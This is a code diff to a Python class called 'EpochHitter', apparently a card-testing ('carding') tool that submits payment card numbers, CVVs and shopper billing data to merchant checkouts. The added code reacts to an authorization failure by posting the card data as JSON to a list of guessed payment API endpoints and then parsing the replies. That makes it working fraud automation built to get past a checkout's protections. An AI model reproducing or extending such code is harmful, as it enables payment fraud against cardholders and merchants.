@@ -273,7 +273,7 @@ class EpochHitter:
                 target_action = cfg['action'] or self.url
                 hdr = {
                     "Content-Type": "application/x-www-form-urlencoded",
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,application/json,*/*;q=0.8",
                     "User-Agent": UA,
                     "Origin": self._get_origin(),
                     "Referer": self.url,
@@ -281,6 +281,46 @@ class EpochHitter:
 
                 async with sess.post(target_action, data=urllib.parse.urlencode(payload), headers=hdr, timeout=15) as r:
                     html_resp = r.text() if callable(r.text) else r.text
+                    
+                    # If form submission returns 401 missing auth header, probe direct JSON API endpoints
+                    if r.status_code == 401 or 'authorization' in html_resp.lower():
+                        api_body = {
+                            "cardNumber": card['card'],
+                            "card": card['card'],
+                            "expirationMonth": card['month'].zfill(2),
+                            "expirationYear": yr_short,
+                            "cardCvc": card['cvv'],
+                            "cvv": card['cvv'],
+                            "billingAddress": {
+                                "firstName": shopper['first_name'],
+                                "lastName": shopper['last_name'],
+                                "email": shopper['email'],
+                                "address": shopper['street'],
+                                "city": shopper['city'],
+                                "state": shopper['state'],
+                                "zip": shopper['postal_code'],
+                                "country": shopper['country']
+                            }
+                        }
+                        json_hdr = {
+                            "Content-Type": "application/json",
+                            "Accept": "application/json",
+                            "User-Agent": UA,
+                            "Origin": self._get_origin(),
+                            "Referer": self.url,
+                        }
+                        api_endpoints = ['/api/v1/checkout/pay', '/api/pay', '/api/payment/submit', '/invoice/pay', '/api/checkout']
+                        for ep in api_endpoints:
+                            target_api = urljoin(self.url, ep)
+                            try:
+                                async with sess.post(target_api, json=api_body, headers=json_hdr, timeout=8) as r_api:
+                                    if r_api.status_code in (200, 201, 400, 422):
+                                        api_resp = r_api.text() if callable(r_api.text) else r_api.text
+                                        result['response_time'] = round(time.time() - t0, 2)
+                                        return self._parse_response(api_resp, r_api.status_code, result)
+                            except Exception:
+                                continue
+
                     result['response_time'] = round(time.time() - t0, 2)
                     return self._parse_response(html_resp, r.status_code, result)
 
